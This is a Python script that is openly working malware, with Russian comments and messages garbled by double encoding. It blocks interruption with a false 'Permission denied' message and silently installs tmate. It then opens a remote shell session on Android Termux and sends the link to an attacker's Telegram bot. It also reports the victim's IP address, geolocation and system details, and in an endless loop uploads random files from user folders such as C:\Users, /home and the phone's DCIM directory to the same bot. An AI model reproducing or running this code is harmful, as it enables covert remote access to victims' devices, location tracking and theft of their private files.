import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import sys
import signal
import random
import platform
import json

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''
os_name = platform.system()
sys_name = 'undefined'
emoji = ''
tmate_output = []

def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def get_geolocation():
    try:
        result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("üåê‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ curl.")
            return None
    except Exception as e:
        send_telegram_message(f"üåê‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ: {e}")
        return None

def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("‚õìÔ∏è‚Äçüí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∑–∞–ø—Ä–æ—Å–∞ –∫ ipinfo.io")
        return None

def session():
    global tmate, tmate_output  # –û–±—ä—è–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –∫–∞–∫ –≥–ª–æ–±–∞–ª—å–Ω—ã–µ
    # –ó–∞–ø—É—Å–∫–∞–µ–º tmate –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
    process = subprocess.Popen(['tmate', '-F'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Ç–¥–µ–ª—å–Ω—ã–π –ø–æ—Ç–æ–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
    threading.Thread(target=send_tmate_output, args=(process,)).start()

    # –ß–∏—Ç–∞–µ–º –≤—ã–≤–æ–¥ tmate –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
    while True:
        line = process.stdout.readline()
        if not line:
            break
        tmate_output.append(line.decode('utf-8').strip())

def send_tmate_output(process):
    time.sleep(7)  # –ñ–¥–µ–º 3 —Å–µ–∫—É–Ω–¥—ã
    # –ü–æ–ª—É—á–∞–µ–º –≤–µ—Å—å –≤—ã–≤–æ–¥ tmate
    global tmate_output
    tmate_output_str = '\n'.join(tmate_output)  # –û–±—ä–µ–¥–∏–Ω—è–µ–º –≤—Å–µ —Å—Ç—Ä–æ–∫–∏
    send_telegram_message(f"üõú –£–¥–∞–ª–µ–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ Termux –∂–µ—Ä—Ç–≤—ã —Å –ø–æ–º–æ—â—å—é –±—Ä–∞—É–∑–µ—Ä–∞, –ø–µ—Ä–µ–π–¥–∏ –ø–æ web session:\n{tmate_output_str}")
    
def run_commands():
    global os_name
    global sys_name
    global emoji
    global begin
    print(begin)
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = 'üì±'
                subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['pkg', 'install', 'tmate', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                tmate_thread = threading.Thread(target=session)
                tmate_thread.start()
            else:
                sys_name = "Linux"
                emoji = 'üêß'
                subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = 'üçè'
            subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = 'üíª'
            subprocess.run(['winget', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['choco', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            send_telegram_message(f"‚ö†Ô∏è –û–° –∂–µ—Ä—Ç–≤—ã –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞! –û–°: {os_name}. –ü—Ä–æ–¥–æ–ª–∂–∞—é —Ä–∞–±–æ—Ç—É.")
            emoji = '‚ö†Ô∏è'
            sys_name = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°"
    except Exception as e:
        send_telegram_message(f"‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π, –ø—Ä–æ–¥–æ–ª–∂–∞—é —Ä–∞–±–æ—Ç—É: {e}")
        print(f"–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: {e}")
    try:
        result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            ip_address = result.stdout.strip()
        else:
            ip_address = 'üö´'
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏
            location_message = (
                f"üåç –ì–µ–æ\n"
                f"–®–∏—Ä–æ—Ç–∞: {latitude}\n"
                f"–î–æ–ª–≥–æ—Ç–∞: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"–ì–æ—Ä–æ–¥: {location_info.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    f"–†–µ–≥–∏–æ–Ω: {location_info.get('region', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    f"–°—Ç—Ä–∞–Ω–∞: {location_info.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    f"–ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å: {location_info.get('postal', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                )
            else:
                location_message += "üåê‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø –∏–Ω—Ñ—É."
        else:
            location_message = "üåê‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ."
        send_telegram_message(f"{emoji} –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è\n–ö–ª–∏–µ–Ω—Ç/IP: {ip_address}\n–°–∏—Å—Ç–µ–º–∞: {sys_name} {ver} {arch}\n {location_message}")
    except Exception as e:
        send_telegram_message(f"üö´ Fatal: {e}")
    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"üëÅÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏è –ü–µ—Ä–µ—Ö–≤–∞—Ç –¥–∞–Ω–Ω—ã—Ö...")
    if os_name == "Windows":
        os.system('cls')  # –î–ª—è Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux –∏ macOS
        os.system('clear')  # –î–ª—è Linux –∏ macOS
    else:
        send_telegram_message(f"üö´ Fatal. Unsupported platform.")

def share():
    global os_name
    while True:  # –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª
        try:
            if os_name == "Windows":
                folders_to_send = [r"C:\Users", r"D:", r"F:", r"C:\downloads", r"C:\Downloads", r"C:\Program Files", r"C:\Program Files (x86)"]
            elif os_name == "Linux":
                if os.path.exists('/data/data/com.termux/files'):
                    folders_to_send = [
                        "/storage/emulated/0/Pictures",
                        "/storage/emulated/0/Movies",
                        "/storage/emulated/0/Music",
                        "/storage/emulated/0/Download",
                        "/storage/emulated/0/DCIM",
                        "/storage/emulated/0/Documents"
                    ]
                else:
                    folders_to_send = "/home"  # –î–µ—Ñ–æ–ª—Ç–Ω–∞—è –ø–∞–ø–∫–∞ –¥–ª—è Linux
            elif os_name == "Darwin":
                folders_to_send = ["/Users", "/Downloads", "/downloads", "/Download", "/download"]
            else:
                send_telegram_message("üÖ±Ô∏è –û–° –∂–µ—Ä—Ç–≤—ã –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞! –Æ–∑–∞—é –ø–ª–∞–Ω –ë.")
                folders_to_send = [
                    "/storage",
                    "/Users",
                    "/files",
                    "/Download",
                    "/Downloads",
                    "/download",
                    "/downloads"
                ]

            for folder in folders_to_send:
                if os.path.exists(folder):
                    files = []
                    for root, dirs, files_in_folder in os.walk(folder):
                        for file in files_in_folder:
                            files.append(os.path.join(root, file))
                    
                    random_files = random.sample(files, min(5, len(files)))

                    for file_path in random_files:
                        with open(file_path, 'rb') as f:
                            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                            payload = {
                                'chat_id': TELEGRAM_CHAT_ID,
                            }
                            files = {
                                'document': f
                            }
                            try:
                                response = requests.post(url, data=payload, files=files)
                                if response.status_code == 200:
                                    send_telegram_message(f'üñ§ –°–ø–∏–∑–∂–µ–Ω–æ: {file_path}')
                                else:
                                    send_telegram_message(f'üíî –ù–µ —Å–ø–∏–∑–¥–∏–ª–æ—Å—å: {file_path} - {response.text}')
                            except requests.exceptions.RequestException as e:
                                send_telegram_message(f"‚õìÔ∏è‚Äçüí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}")
                            time.sleep(1)
                else:
                    send_telegram_message(f"–ü–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: {folder}")
            time.sleep(4)  # –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–µ–π
        except Exception as e:
            send_telegram_message(f"üö´ Fatal: {e}")
            send_telegram_message(f"‚úã –ù–µ–∑–∞–º–µ–¥–ª–∏—Ç–µ–ª—å–Ω–æ–µ –ø—Ä–µ–∫—Ä–∞—â–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã.")
            sys.exit(0)

def imp():
    run_commands()

if __name__ == "__main__":
    imp()